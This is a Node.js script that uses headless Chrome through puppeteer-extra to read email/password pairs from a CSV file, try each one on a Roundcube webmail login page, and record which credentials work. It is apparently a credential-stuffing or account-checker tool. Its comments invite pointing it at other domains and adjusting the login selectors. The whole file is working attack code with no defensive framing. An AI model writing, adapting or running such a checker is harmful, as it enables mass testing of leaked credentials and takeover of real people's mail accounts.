const puppeteer = require("puppeteer-extra");
const csv = require("csv-parser");
const fs = require("fs");
var counter = 0;
var completed = 0;
var wrongPass = 0;
const results = [];
var check;

//Handle csv
fs.createReadStream("emails.csv")
  .pipe(csv())
  .on("data", (data) => results.push(data))
  .on("end", async () => {
    fs.unlinkSync(`./emails_failed.csv`);
    fs.appendFileSync(`./emails_failed.csv`, "Email,Password\n");
    fs.unlinkSync(`./emails_processed.csv`);
    fs.appendFileSync(`./emails_processed.csv`, "Username,Password,Correct\n");
    for (let i = 0; i < results.length; i++) {
      await password(results[i].email, results[i].password);
    }
    console.log("============= FINAL STATS =============");
    console.log("Processed " + counter + " accounts.");
    console.log(completed + " accounts had correct credentials.");
    console.log(wrongPass + " accounts had wrong credentials.");
    console.log("============== COMPLETED ==============");
    process.exit();
  });

//Main
const password = async (email, password) => {
  const browser = await puppeteer.launch({
    executablePath:
      "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", //Enter path to chrome.exe
    headless: true,
  });

  const page = await browser.newPage();

  //Change the link to the domain you want to check for (zst works)
  await page.goto("https://mailer.win/roundcube/", {
    waitUntil: "networkidle0",
  });

  //If the domain doesn't work change the selectors here
  await page.type("#rcmloginuser", `${email}`);
  await page.type("#rcmloginpwd", `${password}`);
  await page.click("#rcmloginsubmit");
  await page.waitForNavigation({ waitUntil: "networkidle0" });

  if ((await page.$("#rcmbtn109")) !== null) {
    console.log("Credentials for " + email + " are correct.");
    check = true;
    fs.appendFileSync(
      `./emails_processed.csv`,
      `${email},${password},${check}\n`
    );
    counter++;
    completed++;
  } else {
    console.log("Credentials for " + email + " are wrong.");
    check = false;
    fs.appendFileSync(
      `./emails_processed.csv`,
      `${email},${password},${check}\n`
    );
    fs.appendFileSync(`./emails_failed.csv`, `${email},${password}\n`);
    counter++;
    wrongPass++;
  }
  await browser.close();
};
